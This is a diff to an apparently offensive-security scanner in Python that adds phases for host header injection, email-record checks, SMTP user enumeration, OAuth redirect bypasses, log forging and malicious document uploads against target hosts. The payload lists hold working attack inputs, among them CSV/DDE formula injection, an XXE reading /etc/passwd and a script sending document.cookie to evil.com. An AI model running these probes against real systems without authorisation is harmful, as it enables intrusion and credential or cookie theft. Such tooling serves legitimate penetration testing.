+        for scheme in ("https://", "http://"):
+            url = f"{scheme}{host_clean}/"
+            orig_fwd = None
+            try:
+                base_req = urllib.request.Request(url, method="GET",
+                    headers={"User-Agent": "Mozilla/5.0"})
+                _, base_headers, base_body = await _async_urlopen(_h_urlopen, base_req, timeout=8)
+                orig_fwd = base_headers.get("X-Forwarded-Host", "")
+                base_body_str = base_body.decode("utf-8", errors="ignore")
+            except Exception:
+                base_body_str = ""
+            for payload in _HOST_INJECT_PAYLOADS:
+                try:
+                    req = urllib.request.Request(url, method="GET",
+                        headers={
+                            "User-Agent": "Mozilla/5.0",
+                            "Host": payload,
+                            "X-Forwarded-Host": payload,
+                            "X-Forwarded-Scheme": "http" if payload == "evil.com" else "https",
+                        })
+                    s, resp_headers, resp_body = await _async_urlopen(_h_urlopen, req, timeout=8)
+                    resp_body_str = resp_body.decode("utf-8", errors="ignore")
+                    if payload in resp_body_str:
+                        findings.append(f"[host-inject-reflected] {url} — Host: {payload} — reflected in body")
+                    if "evil.com" in resp_headers.get("Location", "") or "evil.com" in resp_headers.get("Content-Location", ""):
+                        findings.append(f"[host-inject-redirect] {url} — Host: {payload} — redirect to attacker domain")
+                    if resp_headers.get("X-Forwarded-Host", "") != orig_fwd:
+                        findings.append(f"[host-inject-fwd] {url} — Host: {payload} — XFH modified")
+                    if resp_headers.get("Set-Cookie", "") and payload != host_clean:
+                        findings.append(f"[host-inject-cookie] {url} — Host: {payload} — cookie set under manipulated host")
+                    base_len = len(base_body_str)
+                    if base_len and abs(len(resp_body_str) - base_len) > 100:
+                        findings.append(f"[host-inject-diff] {url} — Host: {payload} — response size differs by {abs(len(resp_body_str) - base_len)} bytes")
+                except Exception:
+                    continue
+            break
+    if not findings:
+        findings.append("[host-inject] No host header injection candidates detected")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"58-HOST-INJECT: {len(findings)} host header injection findings → {out}")
+    return {"58-HOST-INJECT": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 59-EMAIL-SEC: Email Security (SPF/DMARC/DKIM) ━━━━━━━━━
+async def phase_59_EMAIL_SEC(
+    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
+    force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"59-EMAIL-SEC"}:
+        return {}
+    _out = outdir / "email_security.txt"
+    if _out.exists() and not force:
+        return {"59-EMAIL-SEC": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 59-EMAIL-SEC: email security (SPF/DMARC/DKIM)")
+    findings: List[str] = []
+
+    async def _dns_query(record_type: str, name: str) -> List[str]:
+        if t.has("dig"):
+            try:
+                proc = await asyncio.create_subprocess_exec(
+                    "dig", "+short", record_type, name,
+                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
+                )
+                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
+                results = [ln.decode().strip() for ln in stdout.splitlines() if ln.strip()]
+                return results
+            except Exception:
+                pass
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                "nslookup", "-type=" + record_type, name,
+                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
+            )
+            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
+            text = stdout.decode(errors="ignore")
+            results = []
+            for ln in text.splitlines():
+                ln = ln.strip()
+                if "canonical name" in ln.lower() or "name =" in ln.lower():
+                    parts = ln.split("=")
+                    if len(parts) > 1:
+                        results.append(parts[-1].strip().rstrip("."))
+            return results
+        except Exception:
+            pass
+        return []
+
+    spf_records = await _dns_query("TXT", domain)
+    spf_found = [r for r in spf_records if "v=spf1" in r]
+    if spf_found:
+        for spf in spf_found:
+            if "~all" in spf:
+                findings.append(f"[spf-softfail] {domain} — SPF uses ~all (softfail): {spf[:200]}")
+            elif "-all" in spf:
+                findings.append(f"[spf-hardfail] {domain} — SPF uses -all (hardfail): {spf[:200]}")
+            elif "?all" in spf or "+all" in spf:
+                findings.append(f"[spf-weak] {domain} — SPF uses ?all/+all (neutral/pass-all): {spf[:200]}")
+            else:
+                findings.append(f"[spf-present] {domain} — SPF record exists: {spf[:200]}")
+    else:
+        findings.append(f"[spf-missing] {domain} — no SPF record found (domain is spoofable)")
+
+    dmarc_records = await _dns_query("TXT", f"_dmarc.{domain}")
+    dmarc_found = [r for r in dmarc_records if "v=DMARC1" in r]
+    if dmarc_found:
+        for dmarc in dmarc_found:
+            dmarc_lower = dmarc.lower()
+            if "p=reject" in dmarc_lower:
+                findings.append(f"[dmarc-reject] {domain} — DMARC policy=reject: {dmarc[:200]}")
+            elif "p=quarantine" in dmarc_lower:
+                findings.append(f"[dmarc-quarantine] {domain} — DMARC policy=quarantine: {dmarc[:200]}")
+            elif "p=none" in dmarc_lower:
+                findings.append(f"[dmarc-none] {domain} — DMARC policy=none (monitoring only): {dmarc[:200]}")
+            else:
+                findings.append(f"[dmarc-present] {domain} — DMARC record exists: {dmarc[:200]}")
+            if "rua=" not in dmarc_lower and "ruf=" not in dmarc_lower:
+                findings.append(f"[dmarc-no-reporting] {domain} — DMARC has no reporting addresses")
+    else:
+        findings.append(f"[dmarc-missing] {domain} — no DMARC record found (domain is spoofable)")
+
+    for prefix in ["google._domainkey", "selector1._domainkey", "default._domainkey",
+                   "dkim._domainkey", "mail._domainkey", "s1._domainkey", "s2._domainkey"]:
+        dkim_records = await _dns_query("TXT", f"{prefix}.{domain}")
+        if dkim_records:
+            findings.append(f"[dkim-present] {domain} — DKIM key found at {prefix}: {dkim_records[0][:100]}")
+            break
+    else:
+        findings.append(f"[dkim-not-found] {domain} — no common DKIM selectors found")
+
+    if not findings:
+        findings.append(f"[email-sec] {domain} — email security posture assessed")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"59-EMAIL-SEC: {len(findings)} email security findings → {out}")
+    return {"59-EMAIL-SEC": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 60-SMTP-ENUM: SMTP Enumeration & Email Bombing ────────
+_SMTP_COMMANDS = [
+    "VRFY root",
+    "VRFY admin",
+    "VRFY test",
+    "VRFY nobody",
+    "EXPN root",
+    "EXPN admin",
+    "EXPN test",
+    "RCPT TO:<root@{domain}>",
+    "RCPT TO:<admin@{domain}>",
+    "RCPT TO:<test@{domain}>",
+]
+
+async def phase_60_SMTP_ENUM(
+    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
+    force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"60-SMTP-ENUM"}:
+        return {}
+    _out = outdir / "smtp_enumeration.txt"
+    if _out.exists() and not force:
+        return {"60-SMTP-ENUM": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 60-SMTP-ENUM: SMTP enumeration & abuse testing")
+    findings: List[str] = []
+    hosts_file = outdir / "hosts.txt"
+    hosts = read_lines(hosts_file) if hosts_file.exists() else []
+    mx_hosts: List[str] = []
+    if t.has("dig"):
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                "dig", "+short", "MX", domain,
+                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
+            )
+            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
+            for ln in stdout.decode().splitlines():
+                ln = ln.strip()
+                parts = ln.split()
+                if len(parts) >= 2:
+                    mx_hosts.append(parts[-1].rstrip("."))
+                elif ln and not ln.startswith(";"):
+                    mx_hosts.append(ln.rstrip("."))
+        except Exception:
+            pass
+    smtp_targets = mx_hosts[:5] if mx_hosts else [h for h in hosts[:3] if ":" not in h]
+    for smtp_host in smtp_targets:
+        smtp_host_clean = smtp_host.split(":")[0].strip()
+        if not smtp_host_clean:
+            continue
+        for port in (25, 587, 465, 2525):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                result = sock.connect_ex((smtp_host_clean, port))
+                if result != 0:
+                    sock.close()
+                    continue
+                sock.settimeout(10)
+                banner = sock.recv(1024).decode("utf-8", errors="ignore")
+                findings.append(f"[smtp-open] {smtp_host_clean}:{port} — SMTP banner: {banner[:100].strip()}")
+                for cmd in _SMTP_COMMANDS:
+                    try:
+                        cmd_filled = cmd.replace("{domain}", domain)
+                        sock.sendall(f"{cmd_filled}\r\n".encode())
+                        resp = sock.recv(1024).decode("utf-8", errors="ignore")
+                        if any(code in resp for code in ["250", "251", "252"]):
+                            findings.append(f"[smtp-enum] {smtp_host_clean}:{port} — {cmd_filled} — {resp[:80].strip()}")
+                    except Exception:
+                        continue
+                sock.close()
+            except Exception:
+                continue
+    if not findings:
+        findings.append("[smtp-enum] No open SMTP services detected")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"60-SMTP-ENUM: {len(findings)} SMTP findings → {out}")
+    return {"60-SMTP-ENUM": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 61-OAUTH-ADV: Advanced OAuth Bypass Variants ─────────
+_OAUTH_ADV_PATHS = [
+    "/oauth/callback", "/oauth2/callback", "/auth/callback",
+    "/login/oauth2/code", "/oauth/authorize", "/oauth/token",
+    "/oauth2/authorize", "/oauth2/token", "/auth/realms",
+    "/.well-known/openid-configuration",
+    "/.well-known/oauth-authorization-server",
+]
+
+_OAUTH_ADV_REDIRECT_BYPASSES = [
+    "https://evil.com",
+    "https://evil.com/@{domain}",
+    "https://{domain}.evil.com",
+    "https://{domain}@evil.com",
+    "https://evil.com/{domain}",
+    "https://evil.com/?url=https://{domain}",
+    "https://{domain}.evil.com/",
+    "https://evil.com\\@{domain}",
+    "https://evil.com#@{domain}",
+    "https://{domain}%40evil.com",
+    "data:text/html,<script>location='https://evil.com'</script>",
+    "javascript:document.location='https://evil.com'",
+]
+
+async def phase_61_OAUTH_ADV(
+    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
+    prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"61-OAUTH-ADV"}:
+        return {}
+    _out = outdir / "oauth_advanced.txt"
+    if _out.exists() and not force:
+        return {"61-OAUTH-ADV": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 61-OAUTH-ADV: advanced OAuth redirect_uri bypass testing")
+    findings: List[str] = []
+    _o_urlopen = _get_urlopener()
+    _o_extra_headers = _extra_headers_dict()
+    hosts_file = outdir / "hosts.txt"
+    hosts = read_lines(hosts_file) if hosts_file.exists() else []
+    if not hosts:
+        log("warn", "61-OAUTH-ADV: no hosts; skipping")
+        return {"61-OAUTH-ADV": str(_out), "count": 0}
+    for host in hosts[:10]:
+        host_clean = host.split(":")[0].strip()
+        if not host_clean:
+            continue
+        for scheme in ("https://",):
+            base = f"{scheme}{host_clean}"
+            for path in _OAUTH_ADV_PATHS:
+                url = f"{base}{path}"
+                try:
+                    req = urllib.request.Request(url, method="GET",
+                        headers={"User-Agent": "Mozilla/5.0", **_o_extra_headers})
+                    s, _, _ = await _async_urlopen(_o_urlopen, req, timeout=8)
+                    if s not in (200, 302, 301, 303, 307):
+                        continue
+                    findings.append(f"[oauth-endpoint] {url} — HTTP {s}")
+                    for bypass in _OAUTH_ADV_REDIRECT_BYPASSES:
+                        bypass_url = bypass.replace("{domain}", domain)
+                        for param in ("redirect_uri", "redirect", "callback", "return", "next",
+                                      "url", "continue", "destination", "r"):
+                            test_url = f"{url}?{param}={bypass_url}"
+                            try:
+                                treq = urllib.request.Request(test_url, method="GET",
+                                    headers={"User-Agent": "Mozilla/5.0", **_o_extra_headers})
+                                ts, theaders, tbody = await _async_urlopen(_o_urlopen, treq, timeout=8)
+                                tbody_str = tbody.decode("utf-8", errors="ignore")
+                                if "evil.com" in tbody_str:
+                                    findings.append(
+                                        f"[oauth-redirect-bypass] {test_url} — param={param} "
+                                        f"redirect_uri={bypass_url} — reflected in response"
+                                    )
+                                if "evil.com" in theaders.get("Location", ""):
+                                    findings.append(
+                                        f"[oauth-redirect-bypass] {test_url} — param={param} "
+                                        f"redirect_uri={bypass_url} — redirect to attacker domain"
+                                    )
+                            except Exception:
+                                continue
+                except Exception:
+                    continue
+    if not findings:
+        findings.append("[oauth-adv] No advanced OAuth bypasses detected")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"61-OAUTH-ADV: {len(findings)} OAuth findings → {out}")
+    return {"61-OAUTH-ADV": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 62-LOG-INJECT: Log Injection Testing ─────────────────
+_LOG_INJECT_PAYLOADS = [
+    "\r\n[INFO] User admin logged in from 127.0.0.1\r\n",
+    "\r\n[ERROR] Database connection failed: user=admin password=secret\r\n",
+    "\r\n[SECURITY] User authentication bypass successful\r\n",
+    "\r\n[INFO] Password reset token: abc123def456\r\n",
+    "\r\n[INFO] Credit card: 4111-1111-1111-1111\r\n",
+    "\r\n[INFO] Internal IP: 10.0.0.1\r\n",
+    "\n[INFO] Injected log entry\n",
+    "\r\n[CRITICAL] Stack trace: java.lang.RuntimeException: null\r\n",
+]
+
+async def phase_62_LOG_INJECT(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"62-LOG-INJECT"}:
+        return {}
+    _out = outdir / "log_injection.txt"
+    if _out.exists() and not force:
+        return {"62-LOG-INJECT": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 62-LOG-INJECT: log injection / log forging detection")
+    findings: List[str] = []
+    _l_urlopen = _get_urlopener()
+    _l_extra_headers = _extra_headers_dict()
+    urls = outdir / "urls_all.txt"
+    all_urls = read_lines(urls) if urls.exists() else []
+    if not all_urls:
+        log("warn", "62-LOG-INJECT: no URLs; skipping")
+        return {"62-LOG-INJECT": str(_out), "count": 0}
+    log_params = {"log", "debug", "trace", "level", "logging", "loglevel", "verbose", "v", "output"}
+    log_headers = ["X-Forwarded-For", "X-Real-IP", "X-Forwarded-Host", "Referer", "User-Agent"]
+    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:30]
+    for u in param_urls:
+        parsed = urllib.parse.urlparse(u)
+        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        if not qs:
+            continue
+        for param_name in qs:
+            if param_name.lower() not in log_params:
+                continue
+            for payload in _LOG_INJECT_PAYLOADS:
+                try:
+                    test_qs = qs.copy()
+                    test_qs[param_name] = [payload]
+                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
+                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
+                    await _throttle_rate()
+                    req = urllib.request.Request(test_url, method="GET",
+                        headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers})
+                    s, _, _ = await _async_urlopen(_l_urlopen, req, timeout=10)
+                    if s in (200, 201, 302):
+                        findings.append(
+                            f"[log-inject-param] {test_url} — param={param_name} — HTTP {s}"
+                        )
+                        break
+                except Exception:
+                    continue
+    for host in read_lines(outdir / "hosts.txt") if (outdir / "hosts.txt").exists() else []:
+        host_clean = host.split(":")[0].strip() if ":" in host else host.strip()
+        if not host_clean:
+            continue
+        for header_name in log_headers:
+            for payload in _LOG_INJECT_PAYLOADS[:3]:
+                try:
+                    req = urllib.request.Request(f"https://{host_clean}/", method="GET",
+                        headers={
+                            "User-Agent": "Mozilla/5.0",
+                            header_name: payload,
+                            **_l_extra_headers,
+                        })
+                    s, _, _ = await _async_urlopen(_l_urlopen, req, timeout=8)
+                    if s in (200, 201):
+                        findings.append(f"[log-inject-header] https://{host_clean}/ — header={header_name} — HTTP {s}")
+                        break
+                except Exception:
+                    continue
+    if not findings:
+        findings.append("[log-inject] No log injection vectors detected")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"62-LOG-INJECT: {len(findings)} log injection findings → {out}")
+    return {"62-LOG-INJECT": str(out), "count": len(findings)}
+
+
+# ────────────────── Phase 63-DOC-ATTACK: Document-Based Attack Vectors ──────────
+_DOC_ATTACK_ENDPOINTS = [
+    "/upload", "/api/upload", "/file/upload", "/document/upload",
+    "/import", "/api/import", "/csv/import", "/bulk/import",
+    "/api/files", "/api/documents",
+    "/api/v1/upload", "/api/v2/upload",
+]
+_DOC_ATTACK_PAYLOADS = [
+    ("csv", "=CMD|'/C ping 127.0.0.1'!A0"),
+    ("csv", "=HYPERLINK(\"http://evil.com/exfil\",\"Click\")"),
+    ("csv", '=DDE("cmd";"/c calc";"AAA")'),
+    ("csv", "=WEBSERVICE(\"http://evil.com/\")"),
+    ("xlsx", "=EXEC(\"calc\")"),
+    ("docx", "${7*7}"),
+    ("pdf", "<script>app.alert(1)</script>"),
+    ("xml", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
+    ("svg", '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
+    ("html", "<html><body><script>fetch('http://evil.com/steal?cookie='+document.cookie)</script></body></html>"),
+]
+
+async def phase_63_DOC_ATTACK(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"63-DOC-ATTACK"}:
+        return {}
+    _out = outdir / "document_attacks.txt"
+    if _out.exists() and not force:
+        return {"63-DOC-ATTACK": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 63-DOC-ATTACK: document-based attack vector detection")
+    findings: List[str] = []
+    _d_urlopen = _get_urlopener()
+    _d_extra_headers = _extra_headers_dict()
+    hosts_file = outdir / "hosts.txt"
+    hosts = read_lines(hosts_file) if hosts_file.exists() else []
+    if not hosts:
+        log("warn", "63-DOC-ATTACK: no hosts; skipping")
+        return {"63-DOC-ATTACK": str(_out), "count": 0}
+    for host in hosts[:10]:
+        host_clean = host.split(":")[0].strip()
+        if not host_clean:
+            continue
+        for scheme in ("https://", "http://"):
+            base = f"{scheme}{host_clean}"
+            for endpoint in _DOC_ATTACK_ENDPOINTS:
+                url = f"{base}{endpoint}"
+                try:
+                    req = urllib.request.Request(url, method="GET",
+                        headers={"User-Agent": "Mozilla/5.0", **_d_extra_headers})
+                    s, _, _ = await _async_urlopen(_d_urlopen, req, timeout=8)
+                    if s not in (200, 201, 202, 204, 401, 403, 405):
+                        continue
+                    findings.append(f"[doc-attack-endpoint] {url} — HTTP {s}")
+                    for fmt, payload in _DOC_ATTACK_PAYLOADS:
+                        try:
+                            content_map = {
+                                "csv": "text/csv",
+                                "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+                                "docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+                                "pdf": "application/pdf",
+                                "xml": "application/xml",
+                                "svg": "image/svg+xml",
+                                "html": "text/html",
+                            }
+                            ctype = content_map.get(fmt, "application/octet-stream")
+                            post_req = urllib.request.Request(url,
+                                data=payload.encode("utf-8"),
+                                method="POST",
+                                headers={
+                                    "User-Agent": "Mozilla/5.0",
+                                    "Content-Type": ctype,
+                                    "Content-Disposition": f'attachment; filename="exploit.{fmt}"',
+                                    **_d_extra_headers,
+                                })
+                            ps, pheaders, pbody = await _async_urlopen(_d_urlopen, post_req, timeout=10)
+                            pbody_str = pbody.decode("utf-8", errors="ignore")
+                            if ps in (200, 201, 202, 204):
+                                findings.append(
+                                    f"[doc-attack-upload] {url} — format={fmt} — HTTP {ps} "
+                                    f"(document upload accepted)"
+                                )
+                            if "error" in pbody_str.lower() and any(
+                                kw in pbody_str.lower() for kw in ["parse", "invalid", "malformed", "unexpected"]
+                            ):
+                                findings.append(
+                                    f"[doc-attack-parser-error] {url} — format={fmt} — parser error in response"
+                                )
+                        except urllib.error.HTTPError as e:
+                            if e.code in (200, 201, 202, 204):
+                                findings.append(
+                                    f"[doc-attack-upload] {url} — format={fmt} — HTTP {e.code} "
+                                    f"(document upload accepted)"
+                                )
+                        except Exception:
+                            continue
+                except Exception:
+                    continue
+            break
+    if not findings:
+        findings.append("[doc-attack] No document-based attack vectors detected")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"63-DOC-ATTACK: {len(findings)} document attack findings → {out}")
+    return {"63-DOC-ATTACK": str(out), "count": len(findings)}
+
+
 PIPELINE = [
     ("00-SCOPE", phase_00_SCOPE, ("domain", "outdir", "t", "only", "skip", "force")),
     ("01-RECON", phase_01_RECON, ("domain", "outdir", "t", "only", "skip", "resume", "force")),
@@ -7623,6 +8871,20 @@ PIPELINE = [
     ("47-CDN", phase_47_CDN, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
     ("48-CONTENT", phase_48_CONTENT, ("outdir", "t", "only", "skip", "prev", "force")),
     ("49-FRAMEWORKS", phase_49_FRAMEWORKS, ("outdir", "t", "only", "skip", "prev", "force")),
+    ("50-BUCKET-PERMS", phase_50_BUCKET_PERMS, ("outdir", "t", "only", "skip", "force")),
+    ("51-HPP", phase_51_HPP, ("outdir", "t", "only", "skip", "prev", "force")),
+    ("52-SERVERLESS", phase_52_SERVERLESS, ("outdir", "t", "only", "skip", "force")),
+    ("53-CSP", phase_53_CSP, ("outdir", "t", "only", "skip", "force")),
+    ("54-WS-FUZZ", phase_54_WS_FUZZ, ("outdir", "t", "only", "skip", "prev", "force")),
+    ("55-CSV-INJECT", phase_55_CSV_INJECT, ("outdir", "t", "only", "skip", "prev", "force")),
+    ("56-EXPOSED-DB", phase_56_EXPOSED_DB, ("outdir", "t", "only", "skip", "prev", "force")),
+    ("57-DEFAULT-CREDS", phase_57_DEFAULT_CREDS, ("outdir", "t", "only", "skip", "prev", "force")),
+    ("58-HOST-INJECT", phase_58_HOST_INJECT, ("outdir", "t", "only", "skip", "prev", "force")),
+    ("59-EMAIL-SEC", phase_59_EMAIL_SEC, ("domain", "outdir", "t", "only", "skip", "force")),
+    ("60-SMTP-ENUM", phase_60_SMTP_ENUM, ("domain", "outdir", "t", "only", "skip", "force")),
+    ("61-OAUTH-ADV", phase_61_OAUTH_ADV, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
+    ("62-LOG-INJECT", phase_62_LOG_INJECT, ("outdir", "t", "only", "skip", "prev", "force")),
+    ("63-DOC-ATTACK", phase_63_DOC_ATTACK, ("outdir", "t", "only", "skip", "prev", "force")),
 ]
 # Phase weights for progress bar accuracy (heuristic based on typical runtime).
 # Heavier phases (subdomain enum, port scan, nuclei, sqlmap, fuzz) contribute
@@ -7685,6 +8947,20 @@ _PHASE_WEIGHTS: Dict[str, int] = {
     "47-CDN": 2,
     "48-CONTENT": 5,
     "49-FRAMEWORKS": 4,
+    "50-BUCKET-PERMS": 3,
+    "51-HPP": 3,
+    "52-SERVERLESS": 4,
+    "53-CSP": 2,
+    "54-WS-FUZZ": 3,
+    "55-CSV-INJECT": 3,
+    "56-EXPOSED-DB": 4,
+    "57-DEFAULT-CREDS": 4,
+    "58-HOST-INJECT": 3,
+    "59-EMAIL-SEC": 2,
+    "60-SMTP-ENUM": 3,
+    "61-OAUTH-ADV": 3,
+    "62-LOG-INJECT": 3,
+    "63-DOC-ATTACK": 4,
 }
 # Dependency-ordered execution stages. Phases in the same stage are independent
 # of one another (they only read artifacts produced by *earlier* stages, never
@@ -7731,6 +9007,12 @@ STAGES: List[List[str]] = [
     ["45-EVIDENCE"],
     # Stage 17 — New enhancement phases (run after evidence capture)
     ["46-BUCKET", "47-CDN", "48-CONTENT", "49-FRAMEWORKS"],
+    # Stage 18 — Enhancement phases v2: bucket perms + serverless + CSP + exposed DB + default creds
+    ["50-BUCKET-PERMS", "52-SERVERLESS", "53-CSP", "56-EXPOSED-DB", "57-DEFAULT-CREDS", "59-EMAIL-SEC"],
+    # Stage 19 — Injection/param-based phases: HPP, CSV, log inject need url params
+    ["51-HPP", "55-CSV-INJECT", "62-LOG-INJECT", "58-HOST-INJECT"],
+    # Stage 20 — WebSocket fuzzing, OAuth adv, SMTP enum, doc attack
+    ["54-WS-FUZZ", "61-OAUTH-ADV", "60-SMTP-ENUM", "63-DOC-ATTACK"],
 ]
 
 
@@ -7747,8 +9029,8 @@ _RECON_LEVELS = {
     },
     "full": {
         "name": "Full audit",
-        "desc": "All 57 phases — every recon + injection + auth + advanced probe + correlation + evidence",
+        "desc": "All 71 phases — every recon + injection + auth + advanced probe + correlation + evidence + v2 enhancements",
         "phases": VALID_PHASES,
     },
 }
-# 57 phases in PIPELINE: 00-SCOPE through 49-FRAMEWORKS (including 04b, 05b, 11a, 11b, 16A, 16B, 17b, 38b)
+# 71 phases in PIPELINE: 00-SCOPE through 63-DOC-ATTACK (including 04b, 05b, 11a, 11b, 16A, 16B, 17b, 38b, 50-63)
